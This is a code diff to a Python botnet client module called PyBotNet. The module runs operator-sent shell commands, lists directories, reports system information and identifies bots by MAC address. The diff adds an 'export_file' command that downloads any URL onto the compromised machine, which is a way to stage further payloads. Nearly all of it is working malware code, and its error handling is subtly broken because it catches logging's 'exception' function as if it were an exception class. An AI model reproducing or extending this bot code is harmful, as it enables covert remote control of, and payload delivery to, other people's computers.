@@ -1,12 +1,12 @@
 '''Defult PyBotNet scripts'''
+import re
 
 from logging import exception
 from time import sleep
 from subprocess import check_output
-from os import listdir
-
+from os import listdir, getcwd
 from uuid import getnode as get_system_mac_addres
-
+from requests import get
 
 # pybotnet import
 from . import util
@@ -14,20 +14,24 @@ from . import util
 mac_addres = str(get_system_mac_addres())
 
 scripts_name = {
-    mac_addres: 'system mac_addres',
-    "do_sleep": 'do_sleep <scconds> <message>',
-    "get_info": 'get_info',
-    "cmd": 'cmd <command>',
-    "ls": 'ls <route>'
+    mac_addres: "system mac_addres",
+    "do_sleep": "do_sleep <scconds> <message>",
+    "get_info": "get_info",
+    "cmd": "cmd <command>",
+    "ls": "ls <route>",
+    "export_file": "export_file <download link>"
 }
 
-
-def get_command_name(command) -> str:
-    return split_command(command)[0]
+# "import_file": "import_file <route>"
 
 
-def split_command(command) -> list:
+def split_command(command: str) -> list:
     return command.split(' ')
+
+
+def get_command_name(command: str) -> str:
+    '''get first arg'''
+    return split_command(command)[0]
 
 
 def is_command(command) -> bool:
@@ -59,9 +63,11 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
+            elif command_name == 'export_file':
+                return execute_download_manager(command, logger)
 
-        logger.error('invalid command; Wrong format')
-        return 'invalid command; Wrong format'
+        logger.error('execute_scripts invalid command; Wrong format')
+        return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
     except exception as error:
         return f'execute_scripts error: {error}'
@@ -156,3 +162,45 @@ def ls(route: str) -> str:
         return f'ls {error}'
     except exception as error:
         return f'ls Unknown error: {error}'
+
+
+def execute_download_manager(command: str, logger):
+    '''run download_manager function'''
+    command = split_command(command)
+
+    try:
+        down_link = command[1]
+        file_name = re.findall(r'.*/(.*)$', down_link)
+        file_name = (file_name[0])
+
+        logger.info(
+            f'execute_download_manager download_link: {down_link}, file name: {file_name}')
+
+        res = download_manager(down_link, file_name)
+        if res:
+            return f'file download and save; \n\nfrom:\n{down_link} \n\nfile name:\n{file_name} \n\n route:\n{getcwd()}'
+        return f'download False {down_link}'
+
+    except IndexError as error:
+        logger.info(
+            f'execute_download_manager wrong format ;need download link for execute_download_manager; error:{error}')
+        return f'i need download link for execute_download_manager; error:{error}'
+
+    except exception as error:
+        logger.info(
+            f'execute_download_manager; error:{error}')
+        return f'execute_download_manager error:{error}'
+
+
+def download_manager(down_link: str, file_name) -> bool:
+    '''Download Manager'''
+    try:
+        url = down_link
+        req = get(url)
+
+        with open(file_name, "wb") as code:
+            code.write(req.content)
+        return True
+    except exception as error:
+        print(error)
+        return False
